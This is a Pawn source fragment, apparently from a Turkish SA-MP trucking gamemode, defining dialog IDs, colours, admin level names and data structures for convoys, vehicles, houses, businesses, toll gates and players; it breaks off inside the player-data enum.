#define ColorClassFBY			    0x0073FFFF // Blue inchis
#define ColorClassBanka			    0x99B4D1FF //yelowgreen
#define ColorClassFire			    0x8B008BAA //yelowgreen
#define ColorClassPboy          	0xFB8DC0FF // Necunoscuta
#define ColorClassKargocu        	0x53C900FF // Light yellow
#define ColorClassDolmusDriver      0x00C98DFF

// Define Dialogs
#define DialogRegister      		1
#define DialogLogin         		2
#define DialogStats                 3
#define DialogStatsOtherPlayer      4
#define DialogRules                 5
#define DialogReports               6
#define DialogStatsHouse          	7
#define DialogStatsGoHouse          8
#define DialogStatsGoBusiness       9

#define DialogRescue                11
#define DialogBuyLicenses           12

#define DialogTruckerJobMethod      21
#define DialogTruckerSelectLoad     22
#define DialogTruckerStartLoc       23
#define DialogTruckerEndLoc         24

#define DialogBusJobMethod          31
#define DialogBusDriverLoadLoc      32
#define DialogBusDriverUnloadLoc    33

#define DialogGemiciJobMethod		34
#define DialogGemiciLoadLoc      	35
#define DialogGemiciUnloadLoc    	36

#define DialogMafiaJobMethod		37
#define DialogMafiaSelectLoad       38
#define DialogMafiaStartLoc      	39
#define DialogMafiaEndLoc           40

#define DialogBike                  101
#define DialogCar                   102
#define DialogPlane                 103
#define DialogTrailer               104
#define DialogRentCarClass       	105
#define DialogRentCar	        	106
#define DialogBoat                  107
#define DialogNeon                  108

#define DialogWeather               201
#define DialogCarOption             202

#define DialogSelectConvoy          401
#define DialogConvoyMembers         402
#define DialogSelectConvoySifre     403

#define DialogPlayerCommands        501
#define DialogPrimaryCarColor       502
#define DialogSedundaryCarColor     503

#define DialogHouseMenu             601
#define DialogUpgradeHouse          602
#define DialogGoHome                603
#define DialogHouseNameChange       604
#define DialogSellHouse             605
#define DialogBuyCarClass           606
#define DialogBuyCar                607
#define DialogSellCar               608
#define DialogBuyInsurance          609
#define DialogGetCarSelectHouse     610
#define DialogGetCarSelectCar       611
#define DialogUnclampVehicles       612

#define DialogCreateBusSelType      701
#define DialogBusinessMenu          702
#define DialogGoBusiness            703
#define DialogBusinessNameChange    704
#define DialogSellBusiness          705

#define DialogHelpItemChosen        901
#define DialogHelpItem              902

#define DialogOldPassword           1001
#define DialogNewPassword           1002
#define DialogConfirmPassword     	1003

#define DialogPilotJobMethod      	1008
#define DialogPilotSelectLoad     	1009
#define DialogPilotStartLoc       	1010
#define DialogPilotEndLoc         	1011

#define DialogNoResponse            25000

#define DialogDolmusJobMethod       31256
#define DialogDolmusSelectRoute      31257


#define DialogPboySelectQuant    	7013 //nou daca e probleme pun unu mai mare

#define DIALOG_BAN 24999

// Define the maximum amount of convoys at the same time
#define MAX_CONVOYS     			10
#define CONVOY_MAX_MEMBERS          50
#define CONVOY_EMPTY                0
#define CONVOY_OPEN                 1
#define CONVOY_FULL         	    2
#define CONVOY_CLOSED               3
// Define messagecolors
#define ColorRed 0xFF0000FF
#define ColorGreen 0x00FF00FF
#define ColorBlue 0x0000FFFF
#define COLOR_WHITE 0xFFFFFFAA
// Define Virtual Worlds
#define WORLD_JAIL 10254
// Define options for admins
#define AutoKickAfterWarn           1 // Define if the player gets kicked after a certain amount of warnings
#define AutoKickWarnings            3 // Define the amount of warnings before a player is kicked automatically
// Define spectate modes
#define ADMIN_SPEC_TYPE_NONE 0
#define ADMIN_SPEC_TYPE_PLAYER 1
#define ADMIN_SPEC_TYPE_VEHICLE 2


// [ Dinamik Duyuru Sistemi ] ==================================================
#define MAX_DUYURU                          40
#define DUYURU_DIZIN                        "ServerData/Duyuru"

#define DialogDuyuruList                    580
#define DialogDuyuruDuzenle                 581
#define DialogDuyuruGuncelle                582
#define DialogDuyuruEkle               		583

new DinamikDuyuru[MAX_DUYURU][300];
new Iterator:DDs<MAX_DUYURU>;
new DuyuruTimer;

new DuyuruList[MAX_PLAYERS][10],
	DuyuruSayfa[MAX_PLAYERS],
	SecilenDuyuru[MAX_PLAYERS];



// Create some global variables that are used to display large dialogs
new DialogMsg5000[5000];

// These variables are only used during the GameModeInit, they are used for debugging purposes
// A variable to hold the ID of every vehicle (used to record the last ID of a vehicle, for debugging)
new LastVehicleID;
// A variable to hold the ID of every object (used to record the last ID of an object, for debugging)
new LastObjectID;
// A variable to hold the total amount of houses that are loaded
new TotalHouses;
// A variable that holds the last speedcam-id
new TotalCameras;
// A variable that holds the total amount of businesses loaded
new TotalBusiness;

// Will hold the remaining time (in minutes) for a server-restart
new RestartTime;

// This variable holds the number of the last TimedMessage that was sent to all players
//new LastTimedMessage;
// This array holds all timed messages that will be sent every few minutes
/*new ATimedMessages[][255] =
{
	{TXT_TimedRefuel},
	{TXT_TimedConvoy},
	{TXT_TimedGohome},
	{TXT_TimedRentCar},
	{TXT_TimedLicense},
	{TXT_TimedSpeedTraps},
	{TXT_TimedGoBusiness},
	{"~r~PRO IPUCU : ~w~Bir sirket uyesi oldugunuz zaman daha fazla kazanirsiniz"},
	{"~w~Facebook sayfamizi ziyaret etmediniz mi? » ~r~facebook.com/tircilarmekanisamp"},
	{"~w~Hileli oyunculari '~r~/sikayet~w~' komutuyla bildiriniz!"},
	{"~w~Sunucu gelisimi icin onerilerinizi forumumuzdan yapiniz. (Canakkale Meslek.com)"},
	{"~w~Feribot LS Limanindadýr , 2 dakikada bir sefer yapar."},
	{"~w~Kamyonculuk görevlerinde asiri yukleme yaparak daha cok kazanc elde edebilirsiniz. ~r~/asiriyuk"},
	{"~w~Siz de DONATOR olup sunucumuzun efsanevi isimlerinden olabilirsiniz. Detaylar icin ~r~/donator"},
	{"~r~GISE SATISLARIMIZ devam ediyor! ~w~Bir gise sahibi olup gelirlerinizi katlamak istiyorsanýz hemen FORUMu ziyaret edin."},
	{"~w~Hala Marketimizi Ziyaret Etmedinmi ~r~Ne Kadar Ayip ! ~w~buldumbuldum.com/tircilarmekani"},
	{"~r~Rahatsiz mi oldun ? ~w~Bu Duyuru Penceresinden Rahatsiz Oluyorsan ~r~/duyurukapat ~w~Yazman yeterli olacaktir"},
	{"~r~/donatorler  Yazarak ~w~Donator listesine ulasabilir,~r~ /donator ~w~ Yazarak ~r~ Nasil Donatorluk alabilecegini ogrenebilirsin."},
	{"~w~DEV KAMPANYA BASLADI Detaylar icin ~r~/kampanya ~w~yazman yeterli.."},
	{"~r~DUYURU: ~w~Yeni market sayfamiz ~r~Canakkale Meslek.com/Market ~w~AKTIF!"}
//	{"{808080}Message"}
//	{"{808080}Message"}
//	{"{808080}Message"}
//	{"{808080}Message"}
//	{"{808080}Message"}
//	{"{808080}Message"}
};*/

// Holds the data about the random bonus mission
enum TRandomBonusMission
{
	RandomLoad, // Holds the random LoadID
	RandomStartLoc, // Holds the random StartLocation ID
	RandomEndLoc, // Holds the random EndLocation ID
	bool:MissionFinished // Holds true if the bonus mission has been completed by someone, a new random mission will be chosen next
}
// Create one random bonus mission
new RandomBonusMission[TRandomBonusMission];

// Holds the admin-levelnames
new AdminLevelName[8][35] =
{
	{"Oyuncu"}, // Admin-level 0
	{"Yeni Admin - A1"},  // Admin-level 1
	{"Çaylak Admin - A2"},  // Admin-level 2
	{"Admin - Lv 3"},  // Admin-level 3
	{"Deneyimli Admin - A4"},  // Admin-level 4
	{"Yönetici Admin  - A5"},  // Admin-level 5
	{"Yetkili Admin   - A6"},  // Admin-Level 6
	{"KURUCU Admin   - A7"}  // Admin-Level 7

};


// Holds the admin-levelnames
new DjLevelName[3][20] =
{
	{"Oyuncu"}, // Admin-level 0
	{"D1 DJ"},  // Admin-level 1
	{"D2 DJ"}
};
new RehberLevelName[5][10] =
{
	{"Oyuncu"}, // Admin-level 0
	{"R1 Rehber"},
	{"R2 Rehber"},
	{"R3 Rehber"},
	{"R4 Rehber"}
};


// Holds the admin-levelnames
new DonLevelName[2][10] =
{
	{"Oyuncu"}, // Admin-level 0
	{"Donator"}  // Admin-level 1
};

// Holds the reference to the pickup that can reward you with a trucker/busdriver license
new Pickup_License;

// Setup a custom type that holds the data of pickups
enum TPickupData
{
	Float:pux,
	Float:puy,
	Float:puz,
	PickupID
}
// Holds the data for pickups for refuelling (maximum 50 refuel-pickups)
new ARefuelPickups[150][TPickupData];
// Holds the data for pickups for 3 cardealers
new ACarDealerPickups[3][TPickupData];

#define DialogGiseEkle 5550
new SecilenGiseUcret[MAX_PLAYERS],
	SecilenGiseObject[MAX_PLAYERS],
	bool:GiseEkliyor[MAX_PLAYERS];

// Setup a custom type that holds all data about toll-boots (les peages jaune)
enum TTollGate
{
	GateID, // Holds the object-id of the gate
	GateObje2,
	GateOwner[24],
	GateCash,
	Text3D:Gate3D,
	TollPrice, // Holds the price for passing the gate
	GateGecenSayisi,
	GateStatus, // Holds the status of the gate (open = 1, closed = 0)
	Float:TollX, // Holds the coordinates when the gate is opened
	Float:TollY, // Holds the coordinates when the gate is opened
	Float:TollZ, // Holds the coordinates when the gate is opened
	Float:TollRX, // Holds the coordinates when the gate is closed
	Float:TollRY, // Holds the coordinates when the gate is closed
	Float:TollRZ // Holds the coordinates when the gate is closed
}
new ATollGates[MAX_TOLLGATES][TTollGate];

/*
// Setup a custom type that holds all data about toll-boots
enum TTollGate
{
	GateID, // Holds the object-id of the gate
	TollPrice, // Holds the price for passing the gate
	GateStatus, // Holds the status of the gate (open = 1, closed = 0)
	Float:OpenX, // Holds the coordinates when the gate is opened
	Float:OpenY, // Holds the coordinates when the gate is opened
	Float:OpenZ, // Holds the coordinates when the gate is opened
	Float:CloseX, // Holds the coordinates when the gate is closed
	Float:CloseY, // Holds the coordinates when the gate is closed
	Float:CloseZ // Holds the coordinates when the gate is closed
}
new ATollGates[MAX_TOLLGATES][TTollGate];
*/

// Setup a custom type that holds all data about a speedcamera
enum TSpeedCamera
{
	Float:CamX, // Holds the X-coordinate of the camera
	Float:CamY, // Holds the Y-coordinate of the camera
	Float:CamZ, // Holds the Z-coordinate of the camera
	Float:CamAngle, // Holds the Angle of the camera
	CamSpeed, // Holds the maximum speed allowed to pass this camera without being caught
	CamObj1, // Holds the reference to the first camera object
	CamObj2,
	Text3D:LabelID // Holds the reference to the second camera object
}
new ACameras[MAX_CAMERAS][TSpeedCamera];

// Setup a custom type to hold all data about a convoy
enum TConvoyData
{
	Members[CONVOY_MAX_MEMBERS], // This array holds the playerid's of all members (at index 0, the leader is stored), so a convoy can hold 1 leader and 9 members
	LoadID, // Holds the ID of the load
	Location1, // Holds the location-id of the start-location
	Location2, // Holds the location-id of the end-location
	Status, // Holds the status of the convoy (1 = open, 2 = full, 3 = closed, 0 = empty)
	ConvoyStep, // Holds the jobstep for the entire convoy
	TrailerModel, // Holds the trailer-model required by the convoy
	bool:LeaderInformedTrailers, // Is used to inform the leader ONCE if all members failed to have the same trailer
	//Text:ConvoyTextLeader, // This is the textdraw for the leader of the convoy
	//Text:ConvoyTextMember, // This is the textdraw for all members of the convoy
	ConvoyTimer, // This convoy-timer checks everything for the whole convoy
	bool:ConvoySifreli,
	ConvoySifre[100]
}
// Setup an array which holds all data for every convoy
new AConvoys[MAX_CONVOYS][TConvoyData];

new GirilecekConvoy[MAX_PLAYERS];

// Setup a custom type to hold all data about a vehicle
enum TVehicleData
{
    carExists,
	bool:MafiaLoad, // Holds True if the vehicle (or trailer) is carrying a mafia-wanted load
	Fuel, // Holds the amount of fuel for this vehicle
	BelongsToHouse, // Holds the HouseIDto which this vehicle belongs
	bool:StaticVehicle, // Holds true if this is a static vehicle
	bool:Owned, // Holds true if the vehicle is owned by somebody
	Owner[24], // Holds the name of the owned of the vehicle
	Model, // Holds the vehicle-model of this vehicle
	PaintJob, // Holds the ID of the paintjob applied to the vehicle
	Components[14], // Holds all Component-ID's for all components on the vehicle
	Color1, // Holds the primary color for this vehicle
	Color2, // Holds the secundairy color for this vehicle
	NeonLeft, // Holds the neon-object on the left side
	NeonRight, // Holds the neon-object on the right side
	NeonObjectModel, // Holds the object-model of the neons applied to the vehicle
	Float:SpawnX, // Holds the X-coordinate of the parking spot for this vehicle
	Float:SpawnY, // Holds the Y-coordinate of the parking spot for this vehicle
	Float:SpawnZ, // Holds the Z-coordinate of the parking spot for this vehicle
	Float:SpawnRot, // Holds the rotation of the parking spot for this vehicle
	Text3D:VehicleText, // holds a reference to the 3D text label on an owned vehicle
	carVehicle,
	
	bool:Clamped // Holds "true" if the vehicle is clamped by an admin
}
// Setup an array which holds all data for every vehicleid, max 2000 vehicles (server limit)
new AVehicleData[2000][TVehicleData];
new
        CarUpdate[MAX_VEHICLES] = {0, ...},
		Float: CarLastPos[MAX_VEHICLES][3];
#define MAX_DYNAMIC_CARS (1500)
// Setup a custom type that holds all data for businesses
enum TBusinessData
{
	PickupID, // Holds the pickup-id that is linked to this business
	Text3D:DoorText, // Holds the reference to the 3DText above the business's pickup
	MapIconID, // Holds the ID of the mapicon for the business

	BusinessName[100], // Holds the name of the business (this will be displayed above the pickup near the business when it's owned)
	Float:BusinessX, // Holds the X-coordinate of the pickup for the Business
	Float:BusinessY, // Holds the Y-coordinate of the pickup for the Business
	Float:BusinessZ, // Holds the Z-coordinate of the pickup for the Business
	BusinessType, // Holds the type of business (well stacked pizza, burger shot, ...), this defines which icon and interior to use
	BusinessLevel, // Holds the level of upgrades the business has
	LastTransaction, // Holds the amount of minutes when the last transaction took place (buying the business or retrieving the money by the owner)
    AutoEvictDays, // Holds the amount of days where the player last logged in
	bool:Owned, // Holds true if the Business is owned by somebody
	Owner[24] // Holds the name of the owner of the Business
}
// Holds the data for all houses
new ABusinessData[MAX_BUSINESS][TBusinessData];
// This variable holds the business-time (this value is increased every hour and is used to calculate the amount of money a business
// has generated after the last transaction of the business)
//new BusinessTransactionTime;

// Setup a custom type that holds all data for houses
enum THouseData
{
	PickupID, // Holds the pickup-id that is linked to this house
	Text3D:DoorText, // Holds the reference to the 3DText above the house's pickup
	MapIconID, // Holds the ID of the mapicon for the house

	HouseName[100], // Holds the name of the house (this will be displayed above the pickup near the house when it's owned)
	Insurance, // Holds "1" if the house has an insurance for the vehicles belonging to this house
	Float:HouseX, // Holds the X-coordinate of the pickup for the house
	Float:HouseY, // Holds the Y-coordinate of the pickup for the house
	Float:HouseZ, // Holds the Z-coordinate of the pickup for the house
	HouseLevel, // Holds the level of upgrades the house has (also defines how many vehicles can currently be added to the house)
	HouseMaxLevel, // Holds the maximum level this house can be upgraded to
	HousePrice, // Holds the price for buying the house, the same price applies when upgrading a house per level
    AutoEvictDays, // Holds the amount of days where the player last logged in
	bool:Owned, // Holds true if the house is owned by somebody
	Owner[255], // Holds the name of the owner of the house
	bool:HouseOpened, // Holds true if the house is open to the public (anyone can enter), false means: only the owner can enter it
	VehicleIDs[11] // Holds the vehicle-id's of the vehicles linked to this house
}
//degisiklikvar
// Holds the data for all houses
new AHouseData[MAX_HOUSES][THouseData];

// Setup a custom type that holds all data about a house-interior (selected when entering a house, based on the house-level)
enum THouseInterior
{
	InteriorName[50], // Holds the name of the interior
	InteriorID, // Holds the interior-id
	Float:IntX, // Holds the X-coordinate of the spawn-location where you enter the house
	Float:IntY, // Holds the Y-coordinate of the spawn-location where you enter the house
	Float:IntZ // Holds the Z-coordinate of the spawn-location where you enter the house
}
// Holds the data for all interiors for houses
new AHouseInteriors[][THouseInterior] =
{
	{"»» Minik Ev ««", 			0, 		0.0, 		0.0, 		0.0}, // Dummy interior (Level 0), as the house-level starts at 1
	{"»» Minik Ev ««", 			10, 	2262.83, 	-1137.71, 	1050.63}, // Level 1
	{"»» Kucuk Ev  ««", 			2, 		2467.36, 	-1698.38, 	1013.51}, // Level 2
	{"»» Kucuk Ev 2 ««", 			1, 		223.00, 	1289.26, 	1082.20}, // Level 3
	{"»» Orta Ev  ««", 			10, 	2260.76, 	-1210.45, 	1049.02}, // Level 4
	{"»» Orta Ev 2 ««",			8, 		2365.42, 	-1131.85, 	1050.88}, // Level 5
	{"»» Dublex Ev ««",			12, 	2324.33, 	-1144.79, 	1050.71}, // Level 6
	{"»» Buyuk Ev ««", 			15, 	295.14, 	1474.47, 	1080.52}, // Level 7
	{"»» Buyuk Dublex Ev ««", 	3, 		235.50, 	1189.17, 	1080.34}, // Level 8
	{"»» Olaganustu Ev ««", 		7, 		225.63, 	1022.48, 	1084.07}, // Level 9
	{"»» Villa  ««", 			5, 		1299.14, 	-794.77, 	1084.00}, // Level 10
	{"»» Rezidans  ««", 			0, 		1574.2369, 	-1267.3341, 	241.9359}, // Level 11
	{"»» Teknoloji Harihasý Ev  ««", 			0, 		1412.01, -1477.02,  125.39} // Level 12

};

// Setup a custom type that holds all data about a business
enum TBusinessType
{
	InteriorName[50], // Holds the name of the interior
	InteriorID, // Holds the interior-id
	Float:IntX, // Holds the X-coordinate of the spawn-location where you enter the business
	Float:IntY, // Holds the Y-coordinate of the spawn-location where you enter the business
	Float:IntZ, // Holds the Z-coordinate of the spawn-location where you enter the business
	BusPrice, // Holds the price for the business
	BusEarnings, // Holds the earnings for this type of business
	IconID // Holds the icon-id which represents the business
}
// Holds the data for all interiors for businesses
new ABusinessInteriors[][TBusinessType] =
{
	{"»» Dummy ««", 						0, 		0.0, 		0.0, 		0.0,		0,			0,		0}, // Dummy business (Type 0)
	{"»» 7/24 | Market ««", 				6, 		-26.75, 	-55.75, 	1003.6,		3500000,		2430,		52}, // Type 1 (earnings per day: $1200)
	{"»» Alýþveriþ Merkezi ««", 			18, 	-31.0, 		-89.5, 		1003.6,		3750000,		2600,		52}, // Type 2 (earnings per day: $1800)
	{"»» Bar ««", 							11, 	502.25, 	-69.75, 	998.8,		3350000,		2330,		49}, // Type 3 (earnings per day: $840)
	{"»» Berber ««", 						2, 		411.5, 		-21.25, 	1001.8,		2400000,		1670,		7}, // Type 4 (earnings per day: $720)
	{"»» Saç Bakým Merkezi ««",				3, 		418.75, 	-82.5, 		1001.8,		2400000,		1670,		7}, // Type 5 (earnings per day: $840)
	{"»» Bahis Dükkaný ««", 				3, 		833.25, 	7.0, 		1004.2,		4500000,		3125,	52}, // Type 6 (earnings per day: $3600)
	{"»» Burger Shot ««", 					10, 	363.5, 		-74.5, 		1001.5,		2750000,		1910,		10}, // Type 7 (earnings per day: $1800)
	{"»» Kumarhane (4 Dragons) ««", 		10, 	2017.25, 	1017.75, 	996.9,		9500000,		6600,	44}, // Type 8 (earnings per day: $6000)
	{"»» Kumarhane (Caligula) ««",			1, 		2234.0, 	1710.75, 	1011.3,		8500000,		5900,	25}, // Type 9 (earnings per day: $6000)
	{"»» Kumarhane (Küçük) ««", 			12, 	1133.0, 	-9.5,	 	1000.7,		6000000,		4170,	43}, // Type 10 (earnings per day: $4800)
	{"»» Giysi Dükkaný (Binco) ««", 		15, 	207.75, 	-109.0, 	1005.2,		2850000,		1980,		45}, // Type 11 (earnings per day: $2040)
	{"»» Giysi Dükkaný (Pro) ««", 			3, 		207.0, 		-138.75, 	1003.5,		2850000,		1980,		45}, // Type 12 (earnings per day: $2040)
	{"»» Giysi Dükkaný (Urban) ««", 		1, 		203.75, 	-48.5, 		1001.8,		2850000,		1980,		45}, // Type 13 (earnings per day: $2040)
	{"»» Giysi Dükkaný (Victim) ««", 		5, 		226.25, 	-7.5, 		1002.3,		2850000,		1980,		45}, // Type 14 (earnings per day: $2040)
	{"»» Giysi Dükkaný (ZIP) ««",			18, 	161.5, 		-92.25, 	1001.8,		2850000,		1980,		45}, // Type 15 (earnings per day: $2040)
	{"»» Cluckin' Bell ««",					9,		365.75, 	-10.75,  	1001.9,		2750000,		1910,		14}, // Type 16 (earnings per day: $1800)
	{"»» Disko (Küçük) ««", 				17, 	492.75,		-22.0, 		1000.7,		4000000,		2780,	48}, // Type 17 (earnings per day: $2400)
	{"»» Disko (Büyük) ««", 				3, 		-2642.0, 	1406.5, 	906.5,		5600000,		3890,	48}, // Type 18 (earnings per day: $2880)
	{"»» Gymnasium (LS) ««", 				5, 		772.0, 		-3.0, 		1000.8,		2500000,		1740,		54}, // Type 19 (earnings per day: $1200)
	{"»» Gymnasium (SF) ««", 				6, 		774.25, 	-49.0, 		1000.6,		2500000,		1740,		54}, // Type 20 (earnings per day: $1200)
	{"»» Gymnasium (LV) ««", 				7, 		774.25, 	-74.0, 		1000.7,		2500000,		1740,		54}, // Type 21 (earnings per day: $1200)
	{"»» Motel ««", 						15, 	2216.25, 	-1150.5, 	1025.8,		4000000,		2780,	37}, // Type 22 (earnings per day: $2400)
	{"»» RC | Oyuncak Dükkaný ««", 			6, 		-2238.75, 	131.0, 		1035.5,		2600000,		1805,		46}, // Type 23 (earnings per day: $1440)
	{"»» +18 | Oyuncak/Dergi Dükkaný ««", 	3, 		-100.25, 	-22.75, 	1000.8,		2800000,		1945,		38}, // Type 24 (earnings per day: $1920)
	{"»» Mezbaha Binasý ««", 				1, 		933.75, 	2151.0, 	1011.1,		2500000,		1740,		50}, // Type 25 (earnings per day: $1200)
	{"»» Stadyum (Bloodbowl) ««", 			15, 	-1394.25, 	987.5, 		1024.0,		2750000,		1910,	33}, // Type 26 (earnings per day: $4200)
	{"»» Stadyum (Kickstart) ««", 			14, 	-1410.75, 	1591.25, 	1052.6,		2750000,		1910,	33}, // Type 27 (earnings per day: $4200)
	{"»» Stadyum (8-Track) ««", 			7, 		-1396.0, 	-208.25, 	1051.2,		2750000,		1910,	33}, // Type 28 (earnings per day: $4200)
	{"»» Stadyum (Dirt Bike) ««", 			4, 		-1425.0, 	-664.5, 	1059.9,		2750000,		1910,	33}, // Type 29 (earnings per day: $4200)
	{"»» Striptiz Club (Kucuk) ««", 		3, 		1212.75, 	-30.0, 		1001.0,		4750000,		3300,		48}, // Type 30 (earnings per day: $1800)
	{"»» Striptiz Club (Buyuk) ««", 		2, 		1204.75, 	-12.5, 		1001.0,		5900000,		4100,		48}, // Type 31 (earnings per day: $2160)
	{"»» LS - Tattoo ««", 					16, 	-203.0, 	-24.25, 	1002.3,		2500000,		1740,		39}, // Type 32 (earnings per day: $1200)
	{"»» Well Stacked Pizza ««", 			5,	 	372.25, 	-131.50, 	1001.5,		3650000,		2535,		29},  // Type 33 (earnings per day: $1560)
	{"»» Muzik Dukkani ««", 				5,	 	1270.6212, 	-822.1235, 	1645.3466,	2850000,		1980,		48},  // Type 33 (earnings per day: $1560)
	{"»» Giysi Dükkaný (Bestra) ««", 		5,	 	1204.6993, 	-787.2387, 	1755.1439,	1850000,		1285,		48}  // Type 33 (earnings per day: $1560)

/*	{"Dummy", 				0, 		0.0, 		0.0, 		0.0,		0,			0,		0}, // Dummy business (Type 0)
	{"24/7 (Small)", 		6, 		-26.75, 	-55.75, 	1003.6,		500000,		50,		52}, // Type 1 (earnings per day: $1200)
	{"24/7 (Medium)", 		18, 	-31.0, 		-89.5, 		1003.6,		750000,		75,		52}, // Type 2 (earnings per day: $1800)
	{"Bar", 				11, 	502.25, 	-69.75, 	998.8,		350000,		35,		49}, // Type 3 (earnings per day: $840)
	{"Barber (Small)", 		2, 		411.5, 		-21.25, 	1001.8,		300000,		30,		7}, // Type 4 (earnings per day: $720)
	{"Barber (Medium)",		3, 		418.75, 	-82.5, 		1001.8,		350000,		35,		7}, // Type 5 (earnings per day: $840)
	{"Betting shop", 		3, 		833.25, 	7.0, 		1004.2,		1500000,	150,	52}, // Type 6 (earnings per day: $3600)
	{"Burger Shot", 		10, 	363.5, 		-74.5, 		1001.5,		750000,		75,		10}, // Type 7 (earnings per day: $1800)
	{"Casino (4 Dragons)", 	10, 	2017.25, 	1017.75, 	996.9,		2500000,	250,	44}, // Type 8 (earnings per day: $6000)
	{"Casino (Caligula's)", 1, 		2234.0, 	1710.75, 	1011.3,		2500000,	250,	25}, // Type 9 (earnings per day: $6000)
	{"Casino (Small)", 		12, 	1133.0, 	-9.5,	 	1000.7,		2000000,	200,	43}, // Type 10 (earnings per day: $4800)
	{"Clothing (Binco)", 	15, 	207.75, 	-109.0, 	1005.2,		850000,		85,		45}, // Type 11 (earnings per day: $2040)
	{"Clothing (Pro)", 		3, 		207.0, 		-138.75, 	1003.5,		850000,		85,		45}, // Type 12 (earnings per day: $2040)
	{"Clothing (Urban)", 	1, 		203.75, 	-48.5, 		1001.8,		850000,		85,		45}, // Type 13 (earnings per day: $2040)
	{"Clothing (Victim)", 	5, 		226.25, 	-7.5, 		1002.3,		850000,		85,		45}, // Type 14 (earnings per day: $2040)
	{"Clothing (ZIP)",		18, 	161.5, 		-92.25, 	1001.8,		850000,		85,		45}, // Type 15 (earnings per day: $2040)
	{"Cluckin' Bell",		9,		365.75, 	-10.75,  	1001.9,		750000,		75,		14}, // Type 16 (earnings per day: $1800)
	{"Disco (Small)", 		17, 	492.75,		-22.0, 		1000.7,		1000000,	100,	48}, // Type 17 (earnings per day: $2400)
	{"Disco (Large)", 		3, 		-2642.0, 	1406.5, 	906.5,		1200000,	120,	48}, // Type 18 (earnings per day: $2880)
	{"Gym (LS)", 			5, 		772.0, 		-3.0, 		1000.8,		500000,		50,		54}, // Type 19 (earnings per day: $1200)
	{"Gym (SF)", 			6, 		774.25, 	-49.0, 		1000.6,		500000,		50,		54}, // Type 20 (earnings per day: $1200)
	{"Gym (LV)", 			7, 		774.25, 	-74.0, 		1000.7,		500000,		50,		54}, // Type 21 (earnings per day: $1200)
	{"Motel", 				15, 	2216.25, 	-1150.5, 	1025.8,		1000000,	100,	37}, // Type 22 (earnings per day: $2400)
	{"RC shop", 			6, 		-2238.75, 	131.0, 		1035.5,		600000,		60,		46}, // Type 23 (earnings per day: $1440)
	{"Sex-shop", 			3, 		-100.25, 	-22.75, 	1000.8,		800000,		80,		38}, // Type 24 (earnings per day: $1920)
	{"Slaughterhouse", 		1, 		933.75, 	2151.0, 	1011.1,		500000,		50,		50}, // Type 25 (earnings per day: $1200)
	{"Stadium (Bloodbowl)", 15, 	-1394.25, 	987.5, 		1024.0,		1750000,	175,	33}, // Type 26 (earnings per day: $4200)
	{"Stadium (Kickstart)", 14, 	-1410.75, 	1591.25, 	1052.6,		1750000,	175,	33}, // Type 27 (earnings per day: $4200)
	{"Stadium (8-Track)", 	7, 		-1396.0, 	-208.25, 	1051.2,		1750000,	175,	33}, // Type 28 (earnings per day: $4200)
	{"Stadium (Dirt Bike)", 4, 		-1425.0, 	-664.5, 	1059.9,		1750000,	175,	33}, // Type 29 (earnings per day: $4200)
	{"Stripclub (Small)", 	3, 		1212.75, 	-30.0, 		1001.0,		750000,		75,		48}, // Type 30 (earnings per day: $1800)
	{"Stripclub (Large)", 	2, 		1204.75, 	-12.5, 		1001.0,		900000,		90,		48}, // Type 31 (earnings per day: $2160)
	{"Tattoo LS", 			16, 	-203.0, 	-24.25, 	1002.3,		500000,		50,		39}, // Type 32 (earnings per day: $1200)
	{"Well Stacked Pizza", 	5,	 	372.25, 	-131.50, 	1001.5,		650000,		65,		29} // Type 33 (earnings per day: $1560)
*/
};


////


// This holds all data about a report
enum TReport
{
	bool:ReportUsed, // Holds true if this report-spot has been used
	ReportName[24], // Holds the name of the offender
	ReportReason[128] // Holds the reason why he's been reported
}
// This array holds all data about the recent 50 reports that have been reported
new AReports[50][TReport];
new ReportList[5000]; // Setup an array to holds the reports for the report-dialog

// Setup all the fields required for the player data (Speedometer TextDraw, current job, ...)
enum TPlayerData
{
	PlayerSQLID, // Hold the SQLID of the player's account
	PlayerClientID[40], // Oyuncunun Client ID'si
	PlayerPassword[256], // Holds the password of the player's account
	PlayerNewPassword[256], // Holds the new password for the player
	PlayerAdmPassword[350],// Admin þifresi
	PlayerLevel, // The admin-level of the player
	SoruSordu,
	SoruCevaplayan,
	SoruCevapliyor,
	SoruBekliyor,
	SorusuCevaplaniyor,
	SoruCevapladigi,
	SoruSorusu[2048],  // Geçerli soru süresi
    SpawnEtti, // /spawn komutu sýnýrlamasý
	PlayerSpeedWarn,
	PlayerFLevel, // Admin giriþi yapmadan akýlda tutulan PlayerLevel
	PlayerDjLevel,
	PlayerRehberLevel,
	 // The dj-level of the player
	PlayerDonLevel, // The Donator Level of the player
	PlayerJailed, // Holds jail-time left for this player
	PlayerJailedTimer, // Holds the reference to the jail-timer
	PlayerFrozen, // Holds the time this player is frozen
	PlayerFrozenTimer, // Holds the reference to the frozen-timer
	Warnings, // Holds the number of warnings for this player
	Bans, // Holds the number of bans for this player
	BanTime, // Holds the time where the player is unbanned automatically (when the ban is over)
	bool:LoggedIn, // Holds true if the player has properly logged in
	Muted,
	bool:RulesRead, // Holds "true" if the player accepted the rules
	AutoReportTime, // Used to prevent the anti-hack system reporting the player every half a second when the player uses hacks

	TruckerLicense, // Holds "1" if the player has acquired his truckers-license
 	PilotLicense, // Holds "1" if the player has acquired his busdriver license
	BusLicense, // Holds "1" if the player has acquired his busdriver license
	DolmusLicense,
	GemiciLicense,
	MafiaLicense,
	PlayerMoney, // Holds the money of this player
	PlayerScore, // Holds the score of this player
	PlayerWanted, // Hold the wanted level of this player
	PlayerName[24], // Holds the name of the player

	Houses[MAX_HOUSESPERPLAYER], // Holds the HouseID's of the houses that the player owns (index of the AHouseData array)
    CurrentHouse, // Holds the HouseID to track in which house the player currently is (used when accessing the housemenu)
	Business[MAX_BUSINESSPERPLAYER], // Holds the BusinessID's of the business that the player owns
	CurrentBusiness, // Holds the BusinessID to track in which business the player currently is (used when accessing the businessmenu)

	PlayerClass, //Holds the Class that the player chose (1 = truckdriver, 2 = taxidriver, ... -> see DEFINES)

	//spec icin
	bool:Spectating, // Holds "true" if the player is spectating
	Float:SpectateX, // Holds the previous X location of the player (used to restore position after /endspec)
	Float:SpectateY, // Holds the previous Y location of the player (used to restore position after /endspec)
	Float:SpectateZ, // Holds the previous Z location of the player (used to restore position after /endspec)
	Float:SpectateA, // Holds the previous angle of the player (used to restore position after /endspec)
	SpectateID, // Holds the ID of the other player which this player is spectating
	SpectateVehicle, // If the target player is inside a vehicle, store it here
	SpectateType, // Holds the type of spectating (none, player or vehicle)

